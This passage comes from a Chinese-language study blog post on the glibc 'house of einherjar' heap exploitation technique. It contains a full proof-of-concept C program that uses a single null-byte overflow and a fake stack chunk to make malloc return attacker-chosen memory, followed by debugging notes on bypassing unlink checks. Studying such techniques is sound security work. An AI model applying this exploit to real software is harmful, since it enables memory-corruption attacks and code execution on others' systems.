0x38 bytes for 'a'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\ta <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a: %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_a_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n\"</span><span class=\"token punctuation\">,</span> real_a_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// create a fake chunk</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"However, you can also create the chunk in the heap or the bss, as long as you know its address\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(although we could do the unsafe unlink technique here in some scenarios)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token class-name\">size_t</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// size of the chunk just needs to be small enough to stay in the small bin</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// fwd</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// bck</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd_nextsize</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck_nextsize</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk at %p looks like:\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prev_size (not used): %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">/* In this case it is easier if the chunk size attribute has a least significant byte with</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t * a value of 0x00. The least significant byte of this will be 0x00, because the size of </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t * the chunk includes the amount requested plus some amount required for the metadata. */</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tb <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 没有满足对其</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_b_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 这里是 0x100，自动对齐</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 0xf8 bytes for 'b'.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span> b_size_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token comment\">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size is: (0x100) | prev_inuse = 0x101\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\ta<span class=\"token punctuation\">[</span>real_a_size<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is easiest if b.size is a multiple of 0x100 so you \"</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t   <span class=\"token string\">\"don't change the size of b, only its prev_inuse bit\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"If it had been modified, we would need a fake chunk inside \"</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t   <span class=\"token string\">\"b where it will try to consolidate the next chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token comment\">// Write a fake prev_size to the end of a</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe write a fake prev_size to the last %lu bytes of a so that \"</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t   <span class=\"token string\">\"it will consolidate with our fake chunk\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token class-name\">size_t</span> fake_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake prev_size will be %p - %p = %#lx\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">,</span> fake_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">[</span>real_a_size<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token comment\">//Change the fake chunk's size to reflect b's new prev_size</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nModify fake chunk's size to reflect b's new prev_size\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token comment\">// free b and it will consolidate with our fake chunk</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token comment\">//if we allocate another chunk before we free b we will need to </span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token comment\">//do two things: </span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//1) We will need to adjust the size of our fake chunk so that</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">//fake_chunk + fake_chunk's size points to an area we control</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token comment\">//2) we will need to write the size of our fake chunk</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token comment\">//at the location we control. </span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t<span class=\"token comment\">//After doing these two things, when unlink gets called, our fake chunk will</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token comment\">//pass the size(P) == prev_size(next_chunk(P)) test. </span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t<span class=\"token comment\">//otherwise we need to make sure that our fake chunk is up against the</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token comment\">//wilderness</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nNow we can call malloc() and it will begin in our fake chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\td <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Next malloc(0x200) is at %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>typedef 定义的类型 (本质上是一个 char 类型)</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>           <span class=\"token class-name\">uint8_t</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>（当一个 chunk 在使用的时候，它的下一个 chunk 的 previous_size 记录了这个 chunk 的大小，而在 fastbin 中，不会将 p 为置为 0，所以 pre_size = 上一个 chunk 的 size）</p>\n<p>程序流程是：</p>\n<p>先申请一个堆 <code>a = (uint8_t*) malloc(0x38)</code> ，【不知道为什么实际申请的是 0x30】，然后创建一个数组 <code>size_t fake_chunk[6];</code>  ，用该数组来作为 fake_chunk（构造该结构符合 chunk），接着再申请一个堆 <code>b = (uint8_t*) malloc(0xf8);</code> 【这里实际大小为 0x100】</p>\n<p>接着利用 <code>a[real_a_size] = 0;</code>  划重点！！通过这种方式将 b 的 size 的 p 标志位覆盖为 0，导致成为 0x100（原来是 0x101，代表上一个 chunk 被占用），这里代表上一个 chunk 是被释放的 ；能导致覆盖的原因是数组的 0x38 其实是第 0x39 个位置（ <code>a[0x38]</code> ）</p>\n<p>然后修改 <code>fake_size</code>  为 从 b 头指针到 fake_chunk 的头指针的大小（ <code>size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);</code> ）</p>\n<h2 id=\"2调试程序-4\"><a class=\"anchor\" href=\"#2调试程序-4\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到27行a-uint8_t-malloc0x38\"><a class=\"anchor\" href=\"#1执行到27行a-uint8_t-malloc0x38\">#</a> 1. 执行到 27 行 <code>a = (uint8_t*) malloc(0x38);</code></h3>\n<p>这里申请的是 0x38 的 chunk，但是实际只有 0x30【~~ 不过却可以修改 0x40 范围的数据，这点存疑～～后面理解是因为挨着的 top chunk 的 p 位是 1，那么证明这个 chunk a 被使用，可以使用下个 chunk 的 size 位】</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/4U%5DXS%28CIPRGXTB5RS%7D7B%5DVO.png\" alt=\"\" /></p>\n<h3 id=\"2执行到31行printfsince-we-want-to-overflow-a-we-need-the-real-size-of-a-after-rounding-xn-real_a_size\"><a class=\"anchor\" href=\"#2执行到31行printfsince-we-want-to-overflow-a-we-need-the-real-size-of-a-after-rounding-xn-real_a_size\">#</a> 2. 执行到 31 行 <code>printf(&quot;Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n&quot;, real_a_size);</code></h3>\n<p>查看 a 的真实大小，发现是 0x38（只算 data 域，这里基本是与下一个 chunk 的 pre_siez 共用了）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/6C0%7DZ_W3FM2%7D06ZAPFH%40VR3.png\" alt=\"\" /></p>\n<h3 id=\"3执行到55行伪造chunk再栈上\"><a class=\"anchor\" href=\"#3执行到55行伪造chunk再栈上\">#</a> 3. 执行到 55 行 <code>伪造chunk再栈上</code></h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// size of the chunk just needs to be small enough to stay in the small bin</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// fwd</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// bck</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd_nextsize</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck_nextsize</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk at %p looks like:\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prev_size (not used): %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/FW31%60%5BGLJW7I%40%24V%241%25%28QYI4.png\" alt=\"\" /></p>\n<p>这里的伪造为了绕过 unlink 检测（后面要将这个块视为 larger bin 取出来合并）</p>\n<p>unlink 的检测 (在后面 free 触发合并的时候才执行)：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token expression\">FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token expression\">BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// 